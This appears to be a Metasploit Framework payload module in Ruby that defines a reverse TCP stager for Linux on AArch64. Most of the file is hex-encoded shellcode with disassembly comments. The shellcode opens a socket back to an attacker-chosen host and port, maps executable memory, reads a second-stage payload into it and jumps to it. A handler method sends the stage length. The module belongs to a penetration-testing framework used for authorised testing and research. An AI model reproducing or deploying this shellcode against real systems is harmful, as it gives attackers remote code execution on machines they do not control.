##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core/handler/reverse_tcp'


###
#
# ReverseTcp
# ----------
#
# Linux reverse TCP stager.
#
###
module MetasploitModule

  CachedSize = 260

  include Msf::Payload::Stager

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_AARCH64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT' => [ 246, 'n'    ],
              'LHOST' => [ 248, 'ADDR' ],
            },
          'Payload' =>
          [
            # Generated from external/source/shellcode/linux/aarch64/stager_sock_reverse.s
            0x580007c8,          #  ldr	x8, f8 <failed+0x14>
            0xd2800040,          #  mov	x0, #0x2                   	// #2
            0xd2800021,          #  mov	x1, #0x1                   	// #1
            0xd28000c2,          #  mov	x2, #0x6                   	// #6
            0xd4000001,          #  svc	#0x0
            0xf100001f,          #  cmp	x0, #0x0
            0x5400066b,          #  b.lt	e4 <failed>
            0xaa0003ec,          #  mov	x12, x0
            0x58000708,          #  ldr	x8, 100 <failed+0x1c>
            0x10000001,          #  adr	x1, 24 <_start+0x24>
            0x91031021,          #  add	x1, x1, #0xc4
            0xd2800202,          #  mov	x2, #0x10                  	// #16
            0xd4000001,          #  svc	#0x0
            0xf100001f,          #  cmp	x0, #0x0
            0x5400056b,          #  b.lt	e4 <failed>
            0xaa0c03e0,          #  mov	x0, x12
            0xd10013ff,          #  sub	sp, sp, #0x4
            0x58000628,          #  ldr	x8, 108 <failed+0x24>
            0x910003e1,          #  mov	x1, sp
            0xd2800082,          #  mov	x2, #0x4                   	// #4
            0xd4000001,          #  svc	#0x0
            0xb100041f,          #  cmn	x0, #0x1
            0x54000460,          #  b.eq	e4 <failed>
            0xf94003e1,          #  ldr	x1, [sp]
            0x58000583,          #  ldr	x3, 110 <failed+0x2c>
            0x8a030021,          #  and	x1, x1, x3
            0xd2800022,          #  mov	x2, #0x1                   	// #1
            0xd374cc42,          #  lsl	x2, x2, #12
            0x8b020021,          #  add	x1, x1, x2
            0x58000528,          #  ldr	x8, 118 <failed+0x34>
            0x58000540,          #  ldr	x0, 120 <failed+0x3c>
            0xd28000e2,          #  mov	x2, #0x7                   	// #7
            0x58000543,          #  ldr	x3, 128 <failed+0x44>
            0xaa0003e4,          #  mov	x4, x0
            0xd2800005,          #  mov	x5, #0x0                   	// #0
            0xd4000001,          #  svc	#0x0
            0xb100041f,          #  cmn	x0, #0x1
            0x54000280,          #  b.eq	e4 <failed>
            0x58000388,          #  ldr	x8, 108 <failed+0x24>
            0xaa0003e1,          #  mov	x1, x0
            0xaa0c03e0,          #  mov	x0, x12
            0xd2800003,          #  mov	x3, #0x0                   	// #0
            0xf94003e2,          #  ldr	x2, [sp]
            0xd10fa042,          #  sub	x2, x2, #0x3e8
            0xf90003e2,          #  str	x2, [sp]
            0xf100005f,          #  cmp	x2, #0x0
            0x540000cd,          #  b.le	d0 <last>
            0xd2807d02,          #  mov	x2, #0x3e8                 	// #1000
            0xd4000001,          #  svc	#0x0
            0xf100001f,          #  cmp	x0, #0x0
            0x540000eb,          #  b.lt	e4 <failed>
            0x17fffff7,          #  b	a8 <loop>
            0x910fa042,          #  add	x2, x2, #0x3e8
            0xd4000001,          #  svc	#0x0
            0xf100001f,          #  cmp	x0, #0x0
            0x5400004b,          #  b.lt	e4 <failed>
            0x14000000,          #  b	0 <x1>
            0x58000268,          #  ldr	x8, 130 <failed+0x4c>
            0xd2800020,          #  mov	x0, #0x1                   	// #1
            0xd4000001,          #  svc	#0x0
            0x5c110002,          #  .word	0x5c110002
            0x0100007f,          #  .word	0x0100007f
            0x000000c6,          #  .word	0x000000c6
            0x00000000,          #  .word	0x00000000
            0x000000cb,          #  .word	0x000000cb
            0x00000000,          #  .word	0x00000000
            0x0000003f,          #  .word	0x0000003f
            0x00000000,          #  .word	0x00000000
            0xfffff000,          #  .word	0xfffff000
            0x00000000,          #  .word	0x00000000
            0x000000de,          #  .word	0x000000de
            0x00000000,          #  .word	0x00000000
            0xffffffff,          #  .word	0xffffffff
            0x00000000,          #  .word	0x00000000
            0x00001022,          #  .word	0x00001022
            0x00000000,          #  .word	0x00000000
            0x0000005d,          #  .word	0x0000005d
            0x00000000,          #  .word	0x00000000
          ].pack("V*")

        }
      ))
  end

def handle_intermediate_stage(conn, payload)

    print_status("Transmitting stage length value...(#{payload.length} bytes)")

    address_format = 'V'

    # Transmit our intermediate stager
    conn.put( [ payload.length ].pack(address_format) )

    return true
  end

end
